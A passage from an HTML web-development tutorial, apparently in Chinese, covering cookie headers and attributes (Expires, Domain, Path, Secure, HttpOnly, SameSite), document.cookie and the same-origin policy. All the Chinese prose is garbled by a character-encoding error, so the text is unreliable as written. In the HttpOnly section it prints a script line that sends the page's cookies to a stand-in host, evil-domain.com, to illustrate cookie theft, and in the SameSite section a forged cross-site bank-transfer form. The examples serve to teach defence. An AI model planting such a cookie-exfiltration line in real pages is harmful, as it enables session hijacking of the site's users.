</code></pre></div><p>ä¸Šé¢ä»£ç çš„ä¸¤ä¸ª Cookie æ˜¯åŒåçš„ï¼ŒåŒ¹é…è¶Šç²¾ç¡®çš„ Cookie æ’åœ¨è¶Šå‰é¢ã€‚</p><h4 id="http-è¯·æ±‚-cookie-çš„å‘é€" tabindex="-1"><a class="header-anchor" href="#http-è¯·æ±‚-cookie-çš„å‘é€" aria-hidden="true">#</a> HTTP è¯·æ±‚ï¼šCookie çš„å‘é€</h4><p>æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ HTTP è¯·æ±‚æ—¶ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½ä¼šå¸¦ä¸Šç›¸åº”çš„ Cookieã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒæŠŠæœåŠ¡å™¨æ—©å‰ä¿å­˜åœ¨æµè§ˆå™¨çš„è¿™æ®µä¿¡æ¯ï¼Œå†å‘å›æœåŠ¡å™¨ã€‚è¿™æ—¶è¦ä½¿ç”¨ HTTP å¤´ä¿¡æ¯çš„<code>Cookie</code>å­—æ®µã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Cookie: foo=bar
</code></pre></div><p>ä¸Šé¢ä»£ç ä¼šå‘æœåŠ¡å™¨å‘é€åä¸º<code>foo</code>çš„ Cookieï¼Œå€¼ä¸º<code>bar</code>ã€‚</p><p><code>Cookie</code>å­—æ®µå¯ä»¥åŒ…å«å¤šä¸ª Cookieï¼Œä½¿ç”¨åˆ†å·ï¼ˆ<code>;</code>ï¼‰åˆ†éš”ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Cookie: name=value; name2=value2; name3=value3
</code></pre></div><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
</code></pre></div><p>æœåŠ¡å™¨æ”¶åˆ°æµè§ˆå™¨å‘æ¥çš„ Cookie æ—¶ï¼Œæœ‰ä¸¤ç‚¹æ˜¯æ— æ³•çŸ¥é“çš„ã€‚</p><ul><li>Cookie çš„å„ç§å±æ€§ï¼Œæ¯”å¦‚ä½•æ—¶è¿‡æœŸã€‚</li><li>å“ªä¸ªåŸŸåè®¾ç½®çš„ Cookieï¼Œåˆ°åº•æ˜¯ä¸€çº§åŸŸåè®¾çš„ï¼Œè¿˜æ˜¯æŸä¸€ä¸ªäºŒçº§åŸŸåè®¾çš„ã€‚</li></ul><h3 id="cookie-çš„å±æ€§" tabindex="-1"><a class="header-anchor" href="#cookie-çš„å±æ€§" aria-hidden="true">#</a> Cookie çš„å±æ€§</h3><h4 id="expires-max-age" tabindex="-1"><a class="header-anchor" href="#expires-max-age" aria-hidden="true">#</a> Expiresï¼ŒMax-Age</h4><p><code>Expires</code>å±æ€§æŒ‡å®šä¸€ä¸ªå…·ä½“çš„åˆ°æœŸæ—¶é—´ï¼Œåˆ°äº†æŒ‡å®šæ—¶é—´ä»¥åï¼Œæµè§ˆå™¨å°±ä¸å†ä¿ç•™è¿™ä¸ª Cookieã€‚å®ƒçš„å€¼æ˜¯ UTC æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨<code>Date.prototype.toUTCString()</code>è¿›è¡Œæ ¼å¼è½¬æ¢ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
</code></pre></div><p>å¦‚æœä¸è®¾ç½®è¯¥å±æ€§ï¼Œæˆ–è€…è®¾ä¸º<code>null</code>ï¼ŒCookie åªåœ¨å½“å‰ä¼šè¯ï¼ˆsessionï¼‰æœ‰æ•ˆï¼Œæµè§ˆå™¨çª—å£ä¸€æ—¦å…³é—­ï¼Œå½“å‰ Session ç»“æŸï¼Œè¯¥ Cookie å°±ä¼šè¢«åˆ é™¤ã€‚å¦å¤–ï¼Œæµè§ˆå™¨æ ¹æ®æœ¬åœ°æ—¶é—´ï¼Œå†³å®š Cookie æ˜¯å¦è¿‡æœŸï¼Œç”±äºæœ¬åœ°æ—¶é—´æ˜¯ä¸ç²¾ç¡®çš„ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•ä¿è¯ Cookie ä¸€å®šä¼šåœ¨æœåŠ¡å™¨æŒ‡å®šçš„æ—¶é—´è¿‡æœŸã€‚</p><p><code>Max-Age</code>å±æ€§æŒ‡å®šä»ç°åœ¨å¼€å§‹ Cookie å­˜åœ¨çš„ç§’æ•°ï¼Œæ¯”å¦‚<code>60 * 60 * 24 * 365</code>ï¼ˆå³ä¸€å¹´ï¼‰ã€‚è¿‡äº†è¿™ä¸ªæ—¶é—´ä»¥åï¼Œæµè§ˆå™¨å°±ä¸å†ä¿ç•™è¿™ä¸ª Cookieã€‚</p><p>å¦‚æœåŒæ—¶æŒ‡å®šäº†<code>Expires</code>å’Œ<code>Max-Age</code>ï¼Œé‚£ä¹ˆ<code>Max-Age</code>çš„å€¼å°†ä¼˜å…ˆç”Ÿæ•ˆã€‚</p><p>å¦‚æœ<code>Set-Cookie</code>å­—æ®µæ²¡æœ‰æŒ‡å®š<code>Expires</code>æˆ–<code>Max-Age</code>å±æ€§ï¼Œé‚£ä¹ˆè¿™ä¸ª Cookie å°±æ˜¯ Session Cookieï¼Œå³å®ƒåªåœ¨æœ¬æ¬¡å¯¹è¯å­˜åœ¨ï¼Œä¸€æ—¦ç”¨æˆ·å…³é—­æµè§ˆå™¨ï¼Œæµè§ˆå™¨å°±ä¸ä¼šå†ä¿ç•™è¿™ä¸ª Cookieã€‚</p><h4 id="domain-path" tabindex="-1"><a class="header-anchor" href="#domain-path" aria-hidden="true">#</a> Domainï¼ŒPath</h4><p><code>Domain</code>å±æ€§æŒ‡å®šæµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œå“ªäº›åŸŸåè¦é™„å¸¦è¿™ä¸ª Cookieã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šè¯¥å±æ€§ï¼Œæµè§ˆå™¨ä¼šé»˜è®¤å°†å…¶è®¾ä¸ºå½“å‰åŸŸåï¼Œè¿™æ—¶å­åŸŸåå°†ä¸ä¼šé™„å¸¦è¿™ä¸ª Cookieã€‚æ¯”å¦‚ï¼Œ<code>example.com</code>ä¸è®¾ç½® Cookie çš„<code>domain</code>å±æ€§ï¼Œé‚£ä¹ˆ<code>sub.example.com</code>å°†ä¸ä¼šé™„å¸¦è¿™ä¸ª Cookieã€‚å¦‚æœæŒ‡å®šäº†<code>domain</code>å±æ€§ï¼Œé‚£ä¹ˆå­åŸŸåä¹Ÿä¼šé™„å¸¦è¿™ä¸ª Cookieã€‚å¦‚æœæœåŠ¡å™¨æŒ‡å®šçš„åŸŸåä¸å±äºå½“å‰åŸŸåï¼Œæµè§ˆå™¨ä¼šæ‹’ç»è¿™ä¸ª Cookieã€‚</p><p><code>Path</code>å±æ€§æŒ‡å®šæµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œå“ªäº›è·¯å¾„è¦é™„å¸¦è¿™ä¸ª Cookieã€‚åªè¦æµè§ˆå™¨å‘ç°ï¼Œ<code>Path</code>å±æ€§æ˜¯ HTTP è¯·æ±‚è·¯å¾„çš„å¼€å¤´ä¸€éƒ¨åˆ†ï¼Œå°±ä¼šåœ¨å¤´ä¿¡æ¯é‡Œé¢å¸¦ä¸Šè¿™ä¸ª Cookieã€‚æ¯”å¦‚ï¼Œ<code>PATH</code>å±æ€§æ˜¯<code>/</code>ï¼Œé‚£ä¹ˆè¯·æ±‚<code>/docs</code>è·¯å¾„ä¹Ÿä¼šåŒ…å«è¯¥ Cookieã€‚å½“ç„¶ï¼Œå‰ææ˜¯åŸŸåå¿…é¡»ä¸€è‡´ã€‚</p><h4 id="secure-httponly" tabindex="-1"><a class="header-anchor" href="#secure-httponly" aria-hidden="true">#</a> Secureï¼ŒHttpOnly</h4><p><code>Secure</code>å±æ€§æŒ‡å®šæµè§ˆå™¨åªæœ‰åœ¨åŠ å¯†åè®® HTTPS ä¸‹ï¼Œæ‰èƒ½å°†è¿™ä¸ª Cookie å‘é€åˆ°æœåŠ¡å™¨ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœå½“å‰åè®®æ˜¯ HTTPï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¿½ç•¥æœåŠ¡å™¨å‘æ¥çš„<code>Secure</code>å±æ€§ã€‚è¯¥å±æ€§åªæ˜¯ä¸€ä¸ªå¼€å…³ï¼Œä¸éœ€è¦æŒ‡å®šå€¼ã€‚å¦‚æœé€šä¿¡æ˜¯ HTTPS åè®®ï¼Œè¯¥å¼€å…³è‡ªåŠ¨æ‰“å¼€ã€‚</p><p><code>HttpOnly</code>å±æ€§æŒ‡å®šè¯¥ Cookie æ— æ³•é€šè¿‡ JavaScript è„šæœ¬æ‹¿åˆ°ï¼Œä¸»è¦æ˜¯<code>document.cookie</code>å±æ€§ã€<code>XMLHttpRequest</code>å¯¹è±¡å’Œ Request API éƒ½æ‹¿ä¸åˆ°è¯¥å±æ€§ã€‚è¿™æ ·å°±é˜²æ­¢äº†è¯¥ Cookie è¢«è„šæœ¬è¯»åˆ°ï¼Œåªæœ‰æµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œæ‰ä¼šå¸¦ä¸Šè¯¥ Cookieã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;
</code></pre></div><p>ä¸Šé¢æ˜¯è·¨ç«™ç‚¹è½½å…¥çš„ä¸€ä¸ªæ¶æ„è„šæœ¬çš„ä»£ç ï¼Œèƒ½å¤Ÿå°†å½“å‰ç½‘é¡µçš„ Cookie å‘å¾€ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ã€‚å¦‚æœè®¾ç½®äº†ä¸€ä¸ª Cookie çš„<code>HttpOnly</code>å±æ€§ï¼Œä¸Šé¢ä»£ç å°±ä¸ä¼šè¯»åˆ°è¯¥ Cookieã€‚</p><h4 id="samesite" tabindex="-1"><a class="header-anchor" href="#samesite" aria-hidden="true">#</a> SameSite</h4><p>Chrome 51 å¼€å§‹ï¼Œæµè§ˆå™¨çš„ Cookie æ–°å¢åŠ äº†ä¸€ä¸ª<code>SameSite</code>å±æ€§ï¼Œç”¨æ¥é˜²æ­¢ CSRF æ”»å‡»å’Œç”¨æˆ·è¿½è¸ªã€‚</p><p>Cookie å¾€å¾€ç”¨æ¥å­˜å‚¨ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ï¼Œæ¶æ„ç½‘ç«™å¯ä»¥è®¾æ³•ä¼ªé€ å¸¦æœ‰æ­£ç¡® Cookie çš„ HTTP è¯·æ±‚ï¼Œè¿™å°±æ˜¯ CSRF æ”»å‡»ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·ç™»é™†äº†é“¶è¡Œç½‘ç«™<code>your-bank.com</code>ï¼Œé“¶è¡ŒæœåŠ¡å™¨å‘æ¥äº†ä¸€ä¸ª Cookieã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie:id=a3fWa;
</code></pre></div><p>ç”¨æˆ·åæ¥åˆè®¿é—®äº†æ¶æ„ç½‘ç«™<code>malicious.com</code>ï¼Œä¸Šé¢æœ‰ä¸€ä¸ªè¡¨å•ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>&lt;form action=&quot;your-bank.com/transfer&quot; method=&quot;POST&quot;&gt;
  ...
&lt;/form&gt;
</code></pre></div><p>ç”¨æˆ·ä¸€æ—¦è¢«è¯±éª—å‘é€è¿™ä¸ªè¡¨å•ï¼Œé“¶è¡Œç½‘ç«™å°±ä¼šæ”¶åˆ°å¸¦æœ‰æ­£ç¡® Cookie çš„è¯·æ±‚ã€‚ä¸ºäº†é˜²æ­¢è¿™ç§æ”»å‡»ï¼Œè¡¨å•ä¸€èˆ¬éƒ½å¸¦æœ‰ä¸€ä¸ªéšæœº tokenï¼Œå‘Šè¯‰æœåŠ¡å™¨è¿™æ˜¯çœŸå®è¯·æ±‚ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>&lt;form action=&quot;your-bank.com/transfer&quot; method=&quot;POST&quot;&gt;
  &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;dad3weg34&quot;&gt;
  ...
&lt;/form&gt;
</code></pre></div><p>è¿™ç§ç¬¬ä¸‰æ–¹ç½‘ç«™å¼•å¯¼å‘å‡ºçš„ Cookieï¼Œå°±ç§°ä¸ºç¬¬ä¸‰æ–¹ Cookieã€‚å®ƒé™¤äº†ç”¨äº CSRF æ”»å‡»ï¼Œè¿˜å¯ä»¥ç”¨äºç”¨æˆ·è¿½è¸ªã€‚æ¯”å¦‚ï¼ŒFacebook åœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™æ’å…¥ä¸€å¼ çœ‹ä¸è§çš„å›¾ç‰‡ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>&lt;img src=&quot;facebook.com&quot; style=&quot;visibility:hidden;&quot;&gt;
</code></pre></div><p>æµè§ˆå™¨åŠ è½½ä¸Šé¢ä»£ç æ—¶ï¼Œå°±ä¼šå‘ Facebook å‘å‡ºå¸¦æœ‰ Cookie çš„è¯·æ±‚ï¼Œä»è€Œ Facebook å°±ä¼šçŸ¥é“ä½ æ˜¯è°ï¼Œè®¿é—®äº†ä»€ä¹ˆç½‘ç«™ã€‚</p><p>Cookie çš„<code>SameSite</code>å±æ€§ç”¨æ¥é™åˆ¶ç¬¬ä¸‰æ–¹ Cookieï¼Œä»è€Œå‡å°‘å®‰å…¨é£é™©ã€‚å®ƒå¯ä»¥è®¾ç½®ä¸‰ä¸ªå€¼ã€‚</p><blockquote><ul><li>Strict</li><li>Lax</li><li>None</li></ul></blockquote><p><strong>ï¼ˆ1ï¼‰Strict</strong></p><p><code>Strict</code>æœ€ä¸ºä¸¥æ ¼ï¼Œå®Œå…¨ç¦æ­¢ç¬¬ä¸‰æ–¹ Cookieï¼Œè·¨ç«™ç‚¹æ—¶ï¼Œä»»ä½•æƒ…å†µä¸‹éƒ½ä¸ä¼šå‘é€ Cookieã€‚æ¢è¨€ä¹‹ï¼Œåªæœ‰å½“å‰ç½‘é¡µçš„ URL ä¸è¯·æ±‚ç›®æ ‡ä¸€è‡´ï¼Œæ‰ä¼šå¸¦ä¸Š Cookieã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie: CookieName=CookieValue; SameSite=Strict;
</code></pre></div><p>è¿™ä¸ªè§„åˆ™è¿‡äºä¸¥æ ¼ï¼Œå¯èƒ½é€ æˆéå¸¸ä¸å¥½çš„ç”¨æˆ·ä½“éªŒã€‚æ¯”å¦‚ï¼Œå½“å‰ç½‘é¡µæœ‰ä¸€ä¸ª GitHub é“¾æ¥ï¼Œç”¨æˆ·ç‚¹å‡»è·³è½¬å°±ä¸ä¼šå¸¦æœ‰ GitHub çš„ Cookieï¼Œè·³è½¬è¿‡å»æ€»æ˜¯æœªç™»é™†çŠ¶æ€ã€‚</p><p><strong>ï¼ˆ2ï¼‰Lax</strong></p><p><code>Lax</code>è§„åˆ™ç¨ç¨æ”¾å®½ï¼Œå¤§å¤šæ•°æƒ…å†µä¹Ÿæ˜¯ä¸å‘é€ç¬¬ä¸‰æ–¹ Cookieï¼Œä½†æ˜¯å¯¼èˆªåˆ°ç›®æ ‡ç½‘å€çš„ Get è¯·æ±‚é™¤å¤–ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie: CookieName=CookieValue; SameSite=Lax;
</code></pre></div><p>å¯¼èˆªåˆ°ç›®æ ‡ç½‘å€çš„ GET è¯·æ±‚ï¼ŒåªåŒ…æ‹¬ä¸‰ç§æƒ…å†µï¼šé“¾æ¥ï¼Œé¢„åŠ è½½è¯·æ±‚ï¼ŒGET è¡¨å•ã€‚è¯¦è§ä¸‹è¡¨ã€‚</p><table><thead><tr><th>è¯·æ±‚ç±»å‹</th><th style="text-align:center;">ç¤ºä¾‹</th><th style="text-align:right;">æ­£å¸¸æƒ…å†µ</th><th>Lax</th></tr></thead><tbody><tr><td>é“¾æ¥</td><td style="text-align:center;"><code>&lt;a href=&quot;...&quot;&gt;&lt;/a&gt;</code></td><td style="text-align:right;">å‘é€ Cookie</td><td>å‘é€ Cookie</td></tr><tr><td>é¢„åŠ è½½</td><td style="text-align:center;"><code>&lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt;</code></td><td style="text-align:right;">å‘é€ Cookie</td><td>å‘é€ Cookie</td></tr><tr><td>GET è¡¨å•</td><td style="text-align:center;"><code>&lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt;</code></td><td style="text-align:right;">å‘é€ Cookie</td><td>å‘é€ Cookie</td></tr><tr><td>POST è¡¨å•</td><td style="text-align:center;"><code>&lt;form method=&quot;POST&quot; action=&quot;...&quot;&gt;</code></td><td style="text-align:right;">å‘é€ Cookie</td><td>ä¸å‘é€</td></tr><tr><td>iframe</td><td style="text-align:center;"><code>&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;</code></td><td style="text-align:right;">å‘é€ Cookie</td><td>ä¸å‘é€</td></tr><tr><td>AJAX</td><td style="text-align:center;"><code>$.get(&quot;...&quot;)</code></td><td style="text-align:right;">å‘é€ Cookie</td><td>ä¸å‘é€</td></tr><tr><td>Image</td><td style="text-align:center;"><code>&lt;img src=&quot;...&quot;&gt;</code></td><td style="text-align:right;">å‘é€ Cookie</td><td>ä¸å‘é€</td></tr></tbody></table><p>è®¾ç½®äº†<code>Strict</code>æˆ–<code>Lax</code>ä»¥åï¼ŒåŸºæœ¬å°±æœç»äº† CSRF æ”»å‡»ã€‚å½“ç„¶ï¼Œå‰ææ˜¯ç”¨æˆ·æµè§ˆå™¨æ”¯æŒ SameSite å±æ€§ã€‚</p><p><strong>ï¼ˆ3ï¼‰None</strong></p><p>Chrome è®¡åˆ’å°†<code>Lax</code>å˜ä¸ºé»˜è®¤è®¾ç½®ã€‚è¿™æ—¶ï¼Œç½‘ç«™å¯ä»¥é€‰æ‹©æ˜¾å¼å…³é—­<code>SameSite</code>å±æ€§ï¼Œå°†å…¶è®¾ä¸º<code>None</code>ã€‚ä¸è¿‡ï¼Œå‰ææ˜¯å¿…é¡»åŒæ—¶è®¾ç½®<code>Secure</code>å±æ€§ï¼ˆCookie åªèƒ½é€šè¿‡ HTTPS åè®®å‘é€ï¼‰ï¼Œå¦åˆ™æ— æ•ˆã€‚</p><p>ä¸‹é¢çš„è®¾ç½®æ— æ•ˆã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie: widget_session=abc123; SameSite=None
</code></pre></div><p>ä¸‹é¢çš„è®¾ç½®æœ‰æ•ˆã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie: widget_session=abc123; SameSite=None; Secure
</code></pre></div><h3 id="document-cookie" tabindex="-1"><a class="header-anchor" href="#document-cookie" aria-hidden="true">#</a> document.cookie</h3><p><code>document.cookie</code>å±æ€§ç”¨äºè¯»å†™å½“å‰ç½‘é¡µçš„ Cookieã€‚</p><p>è¯»å–çš„æ—¶å€™ï¼Œå®ƒä¼šè¿”å›å½“å‰ç½‘é¡µçš„æ‰€æœ‰ Cookieï¼Œå‰ææ˜¯è¯¥ Cookie ä¸èƒ½æœ‰<code>HTTPOnly</code>å±æ€§ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>document.cookie // &quot;foo=bar;baz=bar&quot;
</code></pre></div><p>ä¸Šé¢ä»£ç ä»<code>document.cookie</code>ä¸€æ¬¡æ€§è¯»å‡ºä¸¤ä¸ª Cookieï¼Œå®ƒä»¬ä¹‹é—´ä½¿ç”¨åˆ†å·åˆ†éš”ã€‚å¿…é¡»æ‰‹åŠ¨è¿˜åŸï¼Œæ‰èƒ½å–å‡ºæ¯ä¸€ä¸ª Cookie çš„å€¼ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>var cookies = document.cookie.split(&#39;;&#39;);

for (var i = 0; i &lt; cookies.length; i++) {
  console.log(cookies[i]);
}
// foo=bar
// baz=bar
</code></pre></div><p><code>document.cookie</code>å±æ€§æ˜¯å¯å†™çš„ï¼Œå¯ä»¥é€šè¿‡å®ƒä¸ºå½“å‰ç½‘ç«™æ·»åŠ  Cookieã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>document.cookie = &#39;fontSize=14&#39;;
</code></pre></div><p>å†™å…¥çš„æ—¶å€™ï¼ŒCookie çš„å€¼å¿…é¡»å†™æˆ<code>key=value</code>çš„å½¢å¼ã€‚æ³¨æ„ï¼Œç­‰å·ä¸¤è¾¹ä¸èƒ½æœ‰ç©ºæ ¼ã€‚å¦å¤–ï¼Œå†™å…¥ Cookie çš„æ—¶å€™ï¼Œå¿…é¡»å¯¹åˆ†å·ã€é€—å·å’Œç©ºæ ¼è¿›è¡Œè½¬ä¹‰ï¼ˆå®ƒä»¬éƒ½ä¸å…è®¸ä½œä¸º Cookie çš„å€¼ï¼‰ï¼Œè¿™å¯ä»¥ç”¨<code>encodeURIComponent</code>æ–¹æ³•è¾¾åˆ°ã€‚</p><p>ä½†æ˜¯ï¼Œ<code>document.cookie</code>ä¸€æ¬¡åªèƒ½å†™å…¥ä¸€ä¸ª Cookieï¼Œè€Œä¸”å†™å…¥å¹¶ä¸æ˜¯è¦†ç›–ï¼Œè€Œæ˜¯æ·»åŠ ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>document.cookie = &#39;test1=hello&#39;;
document.cookie = &#39;test2=world&#39;;
document.cookie
// test1=hello;test2=world
</code></pre></div><p><code>document.cookie</code>è¯»å†™è¡Œä¸ºçš„å·®å¼‚ï¼ˆä¸€æ¬¡å¯ä»¥è¯»å‡ºå…¨éƒ¨ Cookieï¼Œä½†æ˜¯åªèƒ½å†™å…¥ä¸€ä¸ª Cookieï¼‰ï¼Œä¸ HTTP åè®®çš„ Cookie é€šä¿¡æ ¼å¼æœ‰å…³ã€‚æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ Cookie çš„æ—¶å€™ï¼Œ<code>Cookie</code>å­—æ®µæ˜¯ä½¿ç”¨ä¸€è¡Œå°†æ‰€æœ‰ Cookie å…¨éƒ¨å‘é€ï¼›æœåŠ¡å™¨å‘æµè§ˆå™¨è®¾ç½® Cookie çš„æ—¶å€™ï¼Œ<code>Set-Cookie</code>å­—æ®µæ˜¯ä¸€è¡Œè®¾ç½®ä¸€ä¸ª Cookieã€‚</p><p>å†™å…¥ Cookie çš„æ—¶å€™ï¼Œå¯ä»¥ä¸€èµ·å†™å…¥ Cookie çš„å±æ€§ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>document.cookie = &quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;;
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå†™å…¥ Cookie çš„æ—¶å€™ï¼ŒåŒæ—¶è®¾ç½®äº†<code>expires</code>å±æ€§ã€‚å±æ€§å€¼çš„ç­‰å·ä¸¤è¾¹ï¼Œä¹Ÿæ˜¯ä¸èƒ½æœ‰ç©ºæ ¼çš„ã€‚</p><p>å„ä¸ªå±æ€§çš„å†™å…¥æ³¨æ„ç‚¹å¦‚ä¸‹ã€‚</p><ul><li><code>path</code>å±æ€§å¿…é¡»ä¸ºç»å¯¹è·¯å¾„ï¼Œé»˜è®¤ä¸ºå½“å‰è·¯å¾„ã€‚</li><li><code>domain</code>å±æ€§å€¼å¿…é¡»æ˜¯å½“å‰å‘é€ Cookie çš„åŸŸåçš„ä¸€éƒ¨åˆ†ã€‚æ¯”å¦‚ï¼Œå½“å‰åŸŸåæ˜¯<code>example.com</code>ï¼Œå°±ä¸èƒ½å°†å…¶è®¾ä¸º<code>foo.com</code>ã€‚è¯¥å±æ€§é»˜è®¤ä¸ºå½“å‰çš„ä¸€çº§åŸŸåï¼ˆä¸å«äºŒçº§åŸŸåï¼‰ã€‚</li><li><code>max-age</code>å±æ€§çš„å€¼ä¸ºç§’æ•°ã€‚</li><li><code>expires</code>å±æ€§çš„å€¼ä¸º UTC æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨<code>Date.prototype.toUTCString()</code>è¿›è¡Œæ—¥æœŸæ ¼å¼è½¬æ¢ã€‚</li></ul><p><code>document.cookie</code>å†™å…¥ Cookie çš„ä¾‹å­å¦‚ä¸‹ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>document.cookie = &#39;fontSize=14; &#39;
  + &#39;expires=&#39; + someDate.toGMTString() + &#39;; &#39;
  + &#39;path=/subdirectory; &#39;
  + &#39;domain=*.example.com&#39;;
</code></pre></div><p>Cookie çš„å±æ€§ä¸€æ—¦è®¾ç½®å®Œæˆï¼Œå°±æ²¡æœ‰åŠæ³•è¯»å–è¿™äº›å±æ€§çš„å€¼ã€‚</p><p>åˆ é™¤ä¸€ä¸ªç°å­˜ Cookie çš„å”¯ä¸€æ–¹æ³•ï¼Œæ˜¯è®¾ç½®å®ƒçš„<code>expires</code>å±æ€§ä¸ºä¸€ä¸ªè¿‡å»çš„æ—¥æœŸã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>document.cookie = &#39;fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT&#39;;
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œåä¸º<code>fontSize</code>çš„ Cookie çš„å€¼ä¸ºç©ºï¼Œè¿‡æœŸæ—¶é—´è®¾ä¸º1970å¹´1æœˆ1æœˆé›¶ç‚¹ï¼Œå°±ç­‰åŒäºåˆ é™¤äº†è¿™ä¸ª Cookieã€‚</p><h2 id="åŒæºé™åˆ¶" tabindex="-1"><a class="header-anchor" href="#åŒæºé™åˆ¶" aria-hidden="true">#</a> åŒæºé™åˆ¶</h2><h3 id="æ¦‚è¿°-2" tabindex="-1"><a class="header-anchor" href="#æ¦‚è¿°-2" aria-hidden="true">#</a> æ¦‚è¿°</h3><h4 id="å«ä¹‰" tabindex="-1"><a class="header-anchor" href="#å«ä¹‰" aria-hidden="true">#</a> å«ä¹‰</h4><p>1995å¹´ï¼ŒåŒæºæ”¿ç­–ç”± Netscape å…¬å¸å¼•å…¥æµè§ˆå™¨ã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½å®è¡Œè¿™ä¸ªæ”¿ç­–ã€‚</p><p>æœ€åˆï¼Œå®ƒçš„å«ä¹‰æ˜¯æŒ‡ï¼ŒA ç½‘é¡µè®¾ç½®çš„ Cookieï¼ŒB ç½‘é¡µä¸èƒ½æ‰“å¼€ï¼Œé™¤éè¿™ä¸¤ä¸ªç½‘é¡µâ€œåŒæºâ€ã€‚æ‰€è°“â€œåŒæºâ€æŒ‡çš„æ˜¯â€œä¸‰ä¸ªç›¸åŒâ€ã€‚</p><blockquote><ul><li>åè®®ç›¸åŒ</li><li>åŸŸåç›¸åŒ</li><li>ç«¯å£ç›¸åŒï¼ˆè¿™ç‚¹å¯ä»¥å¿½ç•¥ï¼Œè¯¦è§ä¸‹æ–‡ï¼‰</li></ul></blockquote><p>ä¸¾ä¾‹æ¥è¯´ï¼Œ<code>http://www.example.com/dir/page.html</code>è¿™ä¸ªç½‘å€ï¼Œåè®®æ˜¯<code>http://</code>ï¼ŒåŸŸåæ˜¯<code>www.example.com</code>ï¼Œç«¯å£æ˜¯<code>80</code>ï¼ˆé»˜è®¤ç«¯å£å¯ä»¥çœç•¥ï¼‰ï¼Œå®ƒçš„åŒæºæƒ…å†µå¦‚ä¸‹ã€‚</p><ul><li><code>http://www.example.com/dir2/other.html</code>ï¼šåŒæº</li><li><code>http://example.com/dir/other.html</code>ï¼šä¸åŒæºï¼ˆåŸŸåä¸åŒï¼‰</li><li><code>http://v2.www.example.com/dir/other.html</code>ï¼šä¸åŒæºï¼ˆåŸŸåä¸åŒï¼‰</li><li><code>http://www.example.com:81/dir/other.html</code>ï¼šä¸åŒæºï¼ˆç«¯å£ä¸åŒï¼‰</li><li><code>https://www.example.com/dir/page.html</code>ï¼šä¸åŒæºï¼ˆåè®®ä¸åŒï¼‰</li></ul><p>æ³¨æ„ï¼Œæ ‡å‡†è§„å®šç«¯å£ä¸åŒçš„ç½‘å€ä¸æ˜¯åŒæºï¼ˆæ¯”å¦‚8000ç«¯å£å’Œ8001ç«¯å£ä¸æ˜¯åŒæºï¼‰ï¼Œä½†æ˜¯æµè§ˆå™¨æ²¡æœ‰éµå®ˆè¿™æ¡è§„å®šã€‚å®é™…ä¸Šï¼ŒåŒä¸€ä¸ªç½‘åŸŸçš„ä¸åŒç«¯å£ï¼Œæ˜¯å¯ä»¥äº’ç›¸è¯»å– Cookie çš„ã€‚</p><h4 id="ç›®çš„" tabindex="-1"><a class="header-anchor" href="#ç›®çš„" aria-hidden="true">#</a> ç›®çš„</h4><p>åŒæºæ”¿ç­–çš„ç›®çš„ï¼Œæ˜¯ä¸ºäº†ä¿è¯ç”¨æˆ·ä¿¡æ¯çš„å®‰å…¨ï¼Œé˜²æ­¢æ¶æ„çš„ç½‘ç«™çªƒå–æ•°æ®ã€‚</p><p>è®¾æƒ³è¿™æ ·ä¸€ç§æƒ…å†µï¼šA ç½‘ç«™æ˜¯ä¸€å®¶é“¶è¡Œï¼Œç”¨æˆ·ç™»å½•ä»¥åï¼ŒA ç½‘ç«™åœ¨ç”¨æˆ·çš„æœºå™¨ä¸Šè®¾ç½®äº†ä¸€ä¸ª 